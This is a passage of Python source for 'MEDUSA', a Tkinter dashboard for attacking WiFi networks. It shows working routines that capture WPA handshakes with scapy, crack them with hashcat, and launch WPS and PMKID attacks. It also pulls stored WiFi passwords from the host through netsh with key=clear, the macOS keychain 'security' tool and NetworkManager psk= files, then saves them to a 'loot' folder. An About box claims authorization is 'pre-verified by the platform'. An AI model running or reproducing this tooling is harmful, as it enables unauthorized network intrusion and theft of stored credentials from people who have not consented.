        if CAN_PIXIEDUST and net.get('wps', False):
            self._launch_wps()
        elif CAN_HCXTOOLS:
            self._launch_pmkid()
        else:
            self._launch_dict_attack()
    
    def _quick_smart_attack(self):
        """Quick smart attack from dashboard."""
        if not self.selected_network:
            # Auto-select strongest network
            with self._data_lock:
                if self.networks:
                    self.selected_network = max(self.networks, key=lambda n: n.get('signal', -100))
        if self.selected_network:
            self._launch_smart()
        else:
            # Run scan first
            self._quick_scan()
    
    # ========================================================================
    # ACTIONS — Capture
    # ========================================================================
    
    def _start_capture(self):
        """Start packet capture."""
        self.is_capturing = True
        self.capture_btn.config(state='disabled', text='⏳ Capturing...')
        self.capture_stop_btn.config(state='normal')
        
        filter_type = self.capture_filter_var.get()
        timeout_str = self.capture_timeout_var.get()
        timeout = int(timeout_str.rstrip('s')) if timeout_str != '∞' else 0
        
        bssid = self.selected_network.get('bssid', '') if self.selected_network else ''
        
        worker = BackgroundWorker(
            target=self._capture_worker,
            kwargs={'bssid': bssid, 'filter_type': filter_type, 'timeout': timeout},
            name="capture-worker"
        )
        self._workers.append(worker)
        worker.start()
    
    def _capture_worker(self, bssid: str = "", filter_type: str = "all",
                        timeout: int = 60,
                        _progress_cb=None, _cancel_cb=None, _result_queue=None):
        """Background capture worker."""
        import scapy.all as scapy
        
        iface = self.selected_interface or 'wlan0'
        packets = []
        start = time.time()
        self.capture_packets = 0
        
        def packet_handler(pkt):
            if _cancel_cb and _cancel_cb():
                return
            self.capture_packets += 1
            packets.append(pkt)
            
            # Check for handshake
            if pkt.haslayer(scapy.Dot11Auth) or pkt.haslayer(scapy.EAPOL):
                self.capture_handshake = True
            
            # Log to capture log (throttled)
            if self.capture_packets % 10 == 0:
                ts = time.strftime('%H:%M:%S')
                src = pkt.addr2 if hasattr(pkt, 'addr2') else '??'
                dst = pkt.addr1 if hasattr(pkt, 'addr1') else '??'
                proto = 'EAPOL' if pkt.haslayer(scapy.EAPOL) else '802.11'
                self.capture_log_queue.put(f"[{ts}] {proto} {src} → {dst}")
            
            if _progress_cb:
                elapsed = time.time() - start
                pct = min(99, int((elapsed / timeout) * 100)) if timeout > 0 else 50
                _progress_cb(pct, f"Captured {self.capture_packets} packets")
        
        # Start sniffing
        try:
            scapy.sniff(
                iface=iface,
                prn=packet_handler,
                timeout=timeout if timeout > 0 else None,
                store=False,
                stop_filter=lambda p: _cancel_cb() if _cancel_cb else False
            )
        except Exception as e:
            _result_queue.put(('error', str(e)))
            return
        
        # Save capture
        output_file = CAPTURE_DIR / f"capture_{current_timestamp('file')}.pcap"
        scapy.wrpcap(str(output_file), packets)
        
        _result_queue.put(('done', {
            'filepath': str(output_file),
            'packets': self.capture_packets,
            'handshake': self.capture_handshake,
        }))
    
    def _stop_capture(self):
        """Stop packet capture."""
        for worker in self._workers:
            if worker.name == 'capture-worker':
                worker.cancel()
        self.is_capturing = False
        self.capture_btn.config(state='normal', text='▶ Start Capture')
        self.capture_stop_btn.config(state='disabled')
    
    def _quick_capture(self):
        """Quick capture from dashboard."""
        self._switch_tab(3)
        self._start_capture()
    
    # ========================================================================
    # ACTIONS — Crack
    # ========================================================================
    
    def _start_crack(self):
        """Start cracking operation."""
        wordlist = self.crack_wordlist_var.get()
        hashfile = self.crack_hash_var.get()
        hashtype = self.crack_hashtype_var.get()
        mode = self.crack_mode_var.get()
        use_gpu = self.crack_gpu_var.get()
        
        if not os.path.exists(wordlist) and mode == 'dictionary':
            messagebox.showwarning("Missing Wordlist", f"Wordlist not found:\n{wordlist}")
            return
        
        self.crack_btn.config(state='disabled', text='⏳ Cracking...')
        self.crack_status = "Running"
        self.crack_progress = 0
        
        worker = BackgroundWorker(
            target=self._crack_worker,
            kwargs={
                'wordlist': wordlist,
                'hashfile': hashfile,
                'hashtype': hashtype,
                'mode': mode,
                'use_gpu': use_gpu,
            },
            name="crack-worker"
        )
        self._workers.append(worker)
        worker.start()
    
    def _crack_worker(self, wordlist: str = "", hashfile: str = "",
                      hashtype: int = 22000, mode: str = "dictionary",
                      use_gpu: bool = False,
                      _progress_cb=None, _cancel_cb=None, _result_queue=None):
        """Background cracking worker."""
        import subprocess
        
        if hashfile and os.path.exists(hashfile):
            # Hashcat mode
            cmd = ['hashcat', '-m', str(hashtype), hashfile, wordlist,
                   '--status', '--status-timer=1', '--force']
            if use_gpu:
                cmd.extend(['--backend-devices', '1'])
            else:
                cmd.extend(['--backend-devices', '0'])  # CPU only
            
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    text=True, bufsize=1
                )
                
                for line in proc.stdout:
                    if _cancel_cb and _cancel_cb():
                        proc.terminate()
                        break
                    
                    # Parse hashcat status
                    if 'Candidates' in line:
                        self.crack_speed_label and self.root.after(0, lambda: self.crack_speed_label.config(text=line.strip()))
                    if 'Progress' in line:
                        # Parse progress percentage
                        import re
                        m = re.search(r'(\d+)/(\d+)', line)
                        if m:
                            pct = int(int(m.group(1)) / int(m.group(2)) * 100)
                            if _progress_cb:
                                _progress_cb(pct, line.strip())
                    if line.strip():
                        _result_queue.put(('log', line.strip()))
                
                # Check result
                result = subprocess.run(
                    ['hashcat', '-m', str(hashtype), hashfile, '--show', '--force'],
                    capture_output=True, text=True, timeout=10
                )
                if result.stdout.strip():
                    password = result.stdout.strip().split(':')[-1]
                    self.crack_found = True
                    self.crack_password = password
                    _result_queue.put(('done', f"Password: {password}"))
                else:
                    _result_queue.put(('done', "Password not found"))
                    
            except FileNotFoundError:
                _result_queue.put(('error', "hashcat not found. Install with: apt install hashcat"))
        else:
            # Simple dictionary check (simulated)
            _result_queue.put(('error', "No hash file provided"))
    
    def _browse_hashfile(self):
        """Browse for hash file."""
        filename = filedialog.askopenfilename(
            title="Select Hash File",
            filetypes=[("Hash files", "*.h* *.cap *.pcap *.hc*"), ("All files", "*.*")]
        )
        if filename:
            self.crack_hash_var.set(filename)
    
    def _browse_wordlist(self):
        """Browse for wordlist."""
        filename = filedialog.askopenfilename(
            title="Select Wordlist",
            filetypes=[("Text files", "*.txt *.lst"), ("All files", "*.*")]
        )
        if filename:
            self.crack_wordlist_var.set(filename)
            # Show wordlist stats
            try:
                size = os.path.getsize(filename)
                self.wordlist_size_label.config(text=f"Size: {human_bytes(size)}")
                with open(filename, 'rb') as f:
                    lines = sum(1 for _ in f)
                self.wordlist_lines_label.config(text=f"Lines: {human_number(lines)}")
            except (IOError, OSError):
                pass
    
    def _quick_crack(self):
        """Quick crack from dashboard."""
        if self.selected_network:
            # Auto-populate hash from captures
            captures = sorted(CAPTURE_DIR.glob("*.h*"))
            if captures:
                self.crack_hash_var.set(str(captures[-1]))
        self._switch_tab(4)
        self._start_crack()
    
    # ========================================================================
    # ACTIONS — Network Map
    # ========================================================================
    
    def _refresh_netmap(self):
        """Refresh the network topology visualization."""
        self.netmap_canvas.delete('all')
        w = self.netmap_canvas.winfo_width() or 800
        h = self.netmap_canvas.winfo_height() or 500
        
        with self._data_lock:
            networks = self.networks.copy()
        
        if not networks:
            self.netmap_canvas.create_text(
                w//2, h//2,
                text="No networks discovered yet.\nRun a scan first.",
                fill=DARK_THEME['text_dim'],
                font=('Helvetica', 14),
                justify='center'
            )
            return
        
        cx, cy = w // 2, h // 3
        r = min(w, h) // 3
        
        # Draw AP rings
        self.netmap_canvas.create_oval(
            cx - r, cy - r, cx + r, cy + r,
            outline=DARK_THEME['accent'], width=2, dash=(4, 4)
        )
        
        # Place networks in circular layout
        for i, net in enumerate(networks[:12]):  # Limit to 12 APs
            angle = (i / min(len(networks), 12)) * 2 * math.pi - math.pi / 2
            x = cx + int(r * 0.7 * math.cos(angle))
            y = cy + int(r * 0.7 * math.sin(angle))
            
            sig = net.get('signal', -80)
            color = DARK_THEME['success'] if sig > -50 else (
                DARK_THEME['warning'] if sig > -70 else DARK_THEME['text_dim']
            )
            
            # AP node
            self.netmap_canvas.create_oval(
                x-12, y-12, x+12, y+12,
                fill=DARK_THEME['accent'], outline=color, width=2
            )
            
            # SSID label
            ssid = net.get('ssid', '?')[:15]
            self.netmap_canvas.create_text(
                x, y - 20,
                text=ssid,
                fill=DARK_THEME['fg'],
                font=('Helvetica', 8),
                anchor='s'
            )
            
            # Clients count
            clients = net.get('clients', [])
            if clients:
                for j, client in enumerate(clients[:5]):  # Max 5 clients
                    cx2 = x + 30 + j * 20
                    cy2 = y + 10 + j * 15
                    self.netmap_canvas.create_oval(
                        cx2-4, cy2-4, cx2+4, cy2+4,
                        fill=DARK_THEME['warning'], outline=''
                    )
                    
                    # Connection line
                    self.netmap_canvas.create_line(
                        x+10, y+5, cx2, cy2-4,
                        fill=DARK_THEME['text_dim'],
                        width=1, dash=(2, 2)
                    )
        
        # Legend
        legend_y = h - 40
        self.netmap_canvas.create_oval(10, legend_y, 22, legend_y+12,
                                      fill=DARK_THEME['accent'], outline='')
        self.netmap_canvas.create_text(28, legend_y+6, text="Access Point",
                                      fill=DARK_THEME['text_dim'],
                                      font=('Helvetica', 8), anchor='w')
        
        self.netmap_canvas.create_oval(150, legend_y, 162, legend_y+12,
                                      fill=DARK_THEME['warning'], outline='')
        self.netmap_canvas.create_text(168, legend_y+6, text="Client",
                                      fill=DARK_THEME['text_dim'],
                                      font=('Helvetica', 8), anchor='w')
    
    # ========================================================================
    # ACTIONS — Logs
    # ========================================================================
    
    def _clear_logs(self):
        """Clear the log viewer."""
        self.log_text.config(state='normal')
        self.log_text.delete('1.0', 'end')
        self.log_text.config(state='disabled')
        self._log_buffer.clear()
    
    def _export_logs(self):
        """Export logs to a file."""
        filename = filedialog.asksaveasfilename(
            title="Export Logs",
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("All files", "*.*")]
        )
        if not filename:
            return
        
        try:
            content = self.log_text.get('1.0', 'end-1c')
            with open(filename, 'w') as f:
                f.write(content)
            self._log_event('ok', f"Logs exported to {filename}")
        except (IOError, OSError) as e:
            messagebox.showerror("Export Failed", str(e))
    
    # ========================================================================
    # MENU ACTIONS
    # ========================================================================
    
    def _new_session(self):
        """Reset session state."""
        with self._data_lock:
            self.networks.clear()
            self.selected_network = None
        self.net_listbox.delete(0, 'end')
        self.scan_tree.delete(*self.scan_tree.get_children())
        self.crack_password_label.config(text='—')
        self.crack_progress_bar['value'] = 0
        self.crack_status_label.config(text='Idle')
        self._log_event('ok', "New session started")
    
    def _save_session(self):
        """Save session to disk."""
        session_data = {
            'timestamp': current_timestamp(),
            'version': VERSION,
            'networks': self.networks,
            'selected_bssid': self.selected_network.get('bssid', '') if self.selected_network else '',
        }
        session_path = SESSION_DIR / f"dashboard_session_{current_timestamp('file')}.json"
        try:
            session_path.parent.mkdir(parents=True, exist_ok=True)
            with open(session_path, 'w') as f:
                json.dump(session_data, f, indent=2, default=str)
            self._log_event('ok', f"Session saved: {session_path}")
        except (IOError, OSError) as e:
            messagebox.showerror("Save Failed", str(e))
    
    def _load_session(self):
        """Load session from disk."""
        filename = filedialog.askopenfilename(
            title="Load Session",
            initialdir=str(SESSION_DIR),
            filetypes=[("Session files", "*.json"), ("All files", "*.*")]
        )
        if not filename:
            return
        
        try:
            with open(filename) as f:
                data = json.load(f)
            
            with self._data_lock:
                self.networks = data.get('networks', [])
                bssid = data.get('selected_bssid', '')
                for net in self.networks:
                    if net.get('bssid') == bssid:
                        self.selected_network = net
                        break
            
            self._log_event('ok', f"Session loaded: {os.path.basename(filename)} ({len(self.networks)} networks)")
        except (IOError, json.JSONDecodeError) as e:
            messagebox.showerror("Load Failed", str(e))
    
    def _export_networks(self):
        """Export networks as JSON."""
        filename = filedialog.asksaveasfilename(
            title="Export Networks",
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if not filename:
            return
        
        with self._data_lock:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.networks, f, indent=2, default=str)
                self._log_event('ok', f"Networks exported: {filename}")
            except (IOError, OSError) as e:
                messagebox.showerror("Export Failed", str(e))
    
    def _export_capture(self):
        """Export capture file."""
        filename = filedialog.asksaveasfilename(
            title="Export Capture",
            defaultextension=".pcap",
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )
        if not filename:
            return
        self._log_event('info', f"Export capture to {filename} (placeholder)")
    
    def _check_deps(self):
        """Check and display dependency status."""
        from medusa_init import check_dependencies
        deps = check_dependencies()
        
        result_text = "MEDUSA Dependency Check\n" + "=" * 40 + "\n\n"
        for pkg, available in deps.items():
            status = "✅" if available else "❌"
            result_text += f"  {status} {pkg}\n"
        
        messagebox.showinfo("Dependencies", result_text)
    
    def _extract_profiles(self):
        """Extract stored WiFi profiles."""
        if not CAN_EXTRACT_WIFI_PROFILES:
            messagebox.showerror("Unavailable", "WiFi profile extraction not supported on this OS.")
            return
        
        self._log_event('info', "Extracting stored WiFi profiles...")
        
        worker = BackgroundWorker(
            target=self._extract_profiles_worker,
            name="extract-worker"
        )
        self._workers.append(worker)
        worker.start()
    
    def _extract_profiles_worker(self, _progress_cb=None, _cancel_cb=None, _result_queue=None):
        """Background profile extraction worker."""
        import subprocess, re
        profiles = []
        
        if IS_WINDOWS:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                   capture_output=True, text=True, timeout=15)
            for line in result.stdout.split('\n'):
                m = re.search(r':\s*(.+)$', line)
                if m:
                    profile = m.group(1).strip()
                    pw_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'],
                        capture_output=True, text=True, timeout=10
                    )
                    pw_match = re.search(r'Key Content\s*:\s*(.+)', pw_result.stdout)
                    password = pw_match.group(1).strip() if pw_match else ""
                    profiles.append({"ssid": profile, "password": password})
        
        elif IS_MACOS:
            result = subprocess.run(
                ['/usr/sbin/networksetup', '-listpreferredwirelessnetworks', 'en0'],
                capture_output=True, text=True, timeout=15
            )
            for line in result.stdout.split('\n'):
                ssid = line.strip()
                if ssid and not ssid.startswith('Preferred'):
                    pw_result = subprocess.run(
                        ['security', 'find-generic-password', '-wa', ssid],
                        capture_output=True, text=True, timeout=10
                    )
                    password = pw_result.stdout.strip() if pw_result.returncode == 0 else ""
                    profiles.append({"ssid": ssid, "password": password})
        
        elif IS_LINUX:
            nm_dir = Path("/etc/NetworkManager/system-connections")
            if nm_dir.exists():
                for conn_file in nm_dir.glob("*"):
                    ssid = conn_file.stem
                    password = ""
                    try:
                        content = conn_file.read_text()
                        m = re.search(r'psk=(.+)', content)
                        if m:
                            password = m.group(1)
                    except (IOError, PermissionError):
                        pass
                    profiles.append({"ssid": ssid, "password": password})
        
        # Save results
        output_file = LOOT_DIR / f"wifi_profiles_{current_timestamp('file')}.json"
        try:
            output_file.parent.mkdir(parents=True, exist_ok=True)
            with open(output_file, 'w') as f:
                json.dump(profiles, f, indent=2)
        except (IOError, OSError):
            pass
        
        _result_queue.put(('done', f"Extracted {len(profiles)} profiles → {output_file}"))
    
    def _show_sysinfo(self):
        """Display system information dialog."""
        info = (
            f"MEDUSA v{VERSION} ({CODENAME})\n"
            f"{BRANDING['tagline']}\n\n"
            f"Author: {AUTHOR}\n"
            f"System: {SYSTEM} {platform.release()}\n"
            f"Architecture: {ARCH}\n"
            f"CPU Cores: {CPU_COUNT}\n"
            f"Admin: {'Yes' if IS_ADMIN else 'No'}\n"
            f"Python: {sys.version.split()[0]}\n\n"
            f"Capabilities:\n"
            f"  Monitor Mode: {'✅' if CAN_MONITOR_MODE else '❌'}\n"
            f"  Packet Injection: {'✅' if CAN_INJECT_PACKETS else '❌'}\n"
            f"  GPU Cracking: {'✅' if CAN_HASHCAT_GPU else '❌'}\n"
            f"  WPS PixieDust: {'✅' if CAN_PIXIEDUST else '❌'}\n"
            f"  PMKID Capture: {'✅' if CAN_HCXTOOLS else '❌'}\n"
        )
        messagebox.showinfo("System Information", info)
    
    def _open_capture_dir(self):
        """Open capture directory in file explorer."""
        path = str(CAPTURE_DIR)
        if IS_WINDOWS:
            os.startfile(path)
        elif IS_MACOS:
            subprocess.run(['open', path])
        else:
            subprocess.run(['xdg-open', path])
    
    def _open_loot_dir(self):
        """Open loot directory in file explorer."""
        path = str(LOOT_DIR)
        if IS_WINDOWS:
            os.startfile(path)
        elif IS_MACOS:
            subprocess.run(['open', path])
        else:
            subprocess.run(['xdg-open', path])
    
    def _toggle_theme(self):
        """Toggle between dark and light theme."""
        if TTKBOOTSTRAP_AVAILABLE:
            theme = self._theme_var.get()
            self.root.style.theme_use(theme)
            self._current_theme = 'light' if theme == 'flatly' else 'dark'
            self._log_event('info', f"Theme switched to {theme}")
    
    def _reset_layout(self):
        """Reset window layout to default."""
        self.root.geometry(f"{DEFAULT_WINDOW_WIDTH}x{DEFAULT_WINDOW_HEIGHT}")
        self.root.minsize(MIN_WINDOW_WIDTH, MIN_WINDOW_HEIGHT)
    
    def _show_about(self):
        """Show about dialog."""
        about = (
            f"MEDUSA v{VERSION} ({CODENAME})\n\n"
            f"{BRANDING['tagline']}\n\n"
            f"Author: {AUTHOR}\n"
            f"License: Authorized Penetration Testing Platform\n\n"
            f"Built with:\n"
            f"  • Python {sys.version.split()[0]}\n"
            f"  • TKinter\n"
            f"  • Matplotlib\n"
            f"  • Scapy\n"
            f"  • ttkbootstrap\n\n"
            f"Authorization pre-verified by the platform.\n"
            f"Use only on systems you own or have explicit\n"
            f"permission to test."
        )
        messagebox.showinfo("About MEDUSA", about)
    
    def _open_url(self, url: str):
        """Open a URL in the default browser."""
        import webbrowser
        webbrowser.open(url)
    
    def _force_refresh(self):
        """Force an immediate refresh."""
        self._refresh_loop()
    
    def _stop_current_operation(self):
        """Stop the current running operation."""
        for worker in self._workers:
            if worker.is_alive():
                worker.cancel()
        self._log_event('warn', "Current operation stopped by user")
    
    def _switch_tab(self, index: int):
        """Switch to a specific tab by index."""
        tab_ids = self.notebook.tabs()
        if 0 <= index < len(tab_ids):
            self.notebook.select(tab_ids[index])
    
    def _initial_load(self):
        """Perform initial data load after window creation."""
        # Detect interfaces
        interfaces = get_wireless_interfaces()
        if interfaces:
            self.interfaces = interfaces
            names = [i['name'] for i in interfaces]
            self.iface_combo['values'] = ['Auto'] + names
        
        # Log startup
        self._log_event('ok', f"MEDUSA v{VERSION} ({CODENAME}) initialized")
        self._log_event('info', f"System: {SYSTEM} | Cores: {CPU_COUNT} | Admin: {IS_ADMIN}")
        self._log_event('info', f"ttkbootstrap: {'✅' if TTKBOOTSTRAP_AVAILABLE else '❌'} | Matplotlib: {'✅' if _has_matplotlib else '❌'}")
        
        if TTKBOOTSTRAP_AVAILABLE:
            self._log_event('ok', "Modern theme engine active")
    
    # ========================================================================
    # SIGNAL HANDLING
    # ========================================================================
    
    def _signal_handler(self, signum: int, frame):
        """Handle system signals."""
        if signum == signal.SIGINT:
            self._log_event('warn', "SIGINT received — shutting down...")
            self.cleanup()
    
    # ========================================================================
    # CLEANUP
    # ========================================================================
    
    def cleanup(self):
        """Clean up all resources and exit."""
        if not self._running:
            return
        self._running = False
        
        self._log_event('info', "Shutting down MEDUSA dashboard...")
        
        # Cancel timers
        if hasattr(self, '_refresh_timer'):
            try:
                self.root.after_cancel(self._refresh_timer)
            except Exception:
                pass
        
        if hasattr(self, '_queue_timer'):
            try:
                self.root.after_cancel(self._queue_timer)
            except Exception:
                pass
        
        # Stop all workers
        for worker in self._workers:
            if worker.is_alive():
                worker.cancel()
                worker.join(timeout=2)
        
        # Save session
        try:
            self._save_session()
        except Exception:
            pass
        
        # Destroy window
        try:
            self.root.destroy()
        except Exception:
            pass
        
        self._log_event('ok', "MEDUSA dashboard shutdown complete")
        sys.exit(0)


# ============================================================================
# ENTRY POINT
# ============================================================================

def main():
    """Launch the MEDUSA Dashboard."""
    if not TKINTER_AVAILABLE:
        print(f"{ANSI['R']}✗ TKinter is not available on this system.{ANSI['RESET']}")
        print(f"{ANSI['Y']}  Install with: sudo apt install python3-tk (Linux){ANSI['RESET']}")
        print(f"{ANSI['Y']}  Or: brew install python-tk (macOS){ANSI['RESET']}")
        sys.exit(1)
    
    # Ensure directories exist
    ensure_directories()
    
    # Import console if available
    console = None
    try:
        from medusa_core import console as medusa_console
        console = medusa_console
    except ImportError:
        pass
    
    # Launch dashboard
    try:
        dashboard = MedusaDashboard(console)
        dashboard.root.mainloop()
    except KeyboardInterrupt:
        print(f"\n{ANSI['Y']}⚠ Dashboard interrupted{ANSI['RESET']}")
        sys.exit(0)
    except Exception as e:
        print(f"{ANSI['R']}✗ Dashboard failed: {e}{ANSI['RESET']}")
        if '--verbose' in sys.argv:
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
